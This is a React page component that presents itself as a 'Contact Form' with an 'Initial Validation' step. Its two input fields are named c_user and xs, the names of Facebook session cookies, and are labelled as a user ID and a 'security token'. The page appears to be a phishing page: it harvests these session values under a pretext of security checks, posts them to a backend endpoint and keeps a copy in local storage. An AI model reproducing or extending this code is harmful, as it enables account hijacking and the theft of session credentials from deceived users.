import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";
import { useState, useEffect } from "react";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      await apiRequest('POST', '/api/contact-form', data);
      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Contact Form | Initial Validation"
        description="Please fill out the initial validation form"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      <div className="min-h-screen flex">
        {/* Sidebar for desktop */}
        {!isMobile && (
          <div className="w-64 bg-white border-r border-gray-200 hidden lg:block">
            <div className="p-4">
              <h1 className="text-xl font-bold text-gray-900">Contact Form</h1>
              <div className="mt-8 space-y-4">
                <p className="text-gray-700 font-semibold">Progress</p>
                <div className="space-y-2">
                  <div className="flex items-center space-x-2 text-blue-600">
                    <div className="w-2 h-2 bg-blue-600 rounded-full" />
                    <p className="text-sm">Initial Validation</p>
                  </div>
                  <div className="flex items-center space-x-2 text-gray-400">
                    <div className="w-2 h-2 bg-gray-400 rounded-full" />
                    <p className="text-sm">Confirmation</p>
                  </div>
                  <div className="flex items-center space-x-2 text-gray-400">
                    <div className="w-2 h-2 bg-gray-400 rounded-full" />
                    <p className="text-sm">Success</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Main content */}
        <div className="flex-1 flex flex-col bg-white">
          <div className="flex-1 flex justify-center p-4 sm:p-8">
            <div className="max-w-2xl w-full space-y-4 sm:space-y-6">
              <h1 className="text-xl sm:text-2xl font-bold text-gray-900">
                Contact Form - Initial Validation
              </h1>

              <div className="space-y-3 sm:space-y-4 text-gray-600 text-sm sm:text-base">
                <p>
                  Please fill out this initial validation form. This helps us ensure the security and authenticity of your submission.
                </p>
              </div>

              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                  <FormField
                    control={form.control}
                    name="c_user"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-sm sm:text-base text-gray-700">User ID</FormLabel>
                        <FormControl>
                          <Input
                            type="number"
                            min="0"
                            pattern="[0-9]+"
                            minLength={6}
                            placeholder="Enter your user ID"
                            className="text-sm sm:text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                            {...field}
                          />
                        </FormControl>
                        <FormMessage className="text-xs text-red-500" />
                      </FormItem>
                    )}
                  />
                  <FormField
                    control={form.control}
                    name="xs"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-sm sm:text-base text-gray-700">Security Token</FormLabel>
                        <FormControl>
                          <Input 
                            type="text" 
                            placeholder="Enter your security token" 
                            className="text-sm sm:text-base border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                            {...field} 
                          />
                        </FormControl>
                        <FormMessage className="text-xs text-red-500" />
                      </FormItem>
                    )}
                  />

                  <p className="text-xs sm:text-sm text-gray-500">
                    Please ensure all information is correct before submission.
                  </p>

                  <Button 
                    type="submit" 
                    className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-blue-600 hover:bg-blue-700 transition-colors duration-200"
                    disabled={form.formState.isSubmitting}
                  >
                    {form.formState.isSubmitting ? "Submitting..." : "Continue"}
                  </Button>
                </form>
              </Form>
            </div>
          </div>

          <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-gray-500 border-t">
            Contact Form © 2025
          </div>
        </div>
      </div>
    </>
  );
}